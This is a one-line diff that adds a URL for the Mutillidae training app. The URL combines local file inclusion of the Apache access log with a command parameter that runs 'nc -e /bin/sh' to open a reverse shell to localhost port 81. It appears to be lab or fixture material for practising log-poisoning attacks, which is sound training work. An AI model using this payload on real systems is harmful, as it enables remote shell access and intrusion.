@@ -1,0 +1,1 @@
+http://mutillidae.local/index.php?page=/var/log/apache2/localhost-access.log&cmd=nc%20-e%20/bin/sh%20127.0.0.1%2081
